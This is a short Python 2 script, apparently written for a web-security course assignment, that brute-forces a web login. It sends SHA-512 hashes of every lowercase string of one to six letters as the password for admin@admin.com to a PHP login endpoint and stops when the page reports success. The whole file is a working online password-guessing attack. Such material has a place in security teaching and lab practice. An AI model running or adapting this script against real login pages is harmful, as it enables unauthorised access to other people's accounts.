import urllib, urllib2, hashlib
def checkpassword(password):
    passwordhash = hashlib.sha512(password).hexdigest()
    url = 'http://www.wsb.com/Assignment2/case17/includes/process_login.php'
    values = dict(email='admin@admin.com', p=passwordhash)
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    rsp = urllib2.urlopen(req).read()
    if "Protected Page" in rsp:
        print "The password is " + password
        exit()

charlist=list("abcdefghijklmnopqrstuvwxyz")
# charlist = list("dhls")
for char1 in charlist:
    s1 = char1
    print "checking starting from: " + s1
    checkpassword(char1)
    for char2 in charlist:
        s2 = s1 + char2
        checkpassword(s2)
        for char3 in charlist:
            s3 = s2 + char3
            print "checking starting from: " + s3
            checkpassword(s3)
            for char4 in charlist:
                s4 = s3 + char4
                checkpassword(s4)
                for char5 in charlist:
                    s5 = s4 + char5
                    checkpassword(s5)
                    for char6 in charlist:
                        s6 = s5 + char6
                        checkpassword(s6)
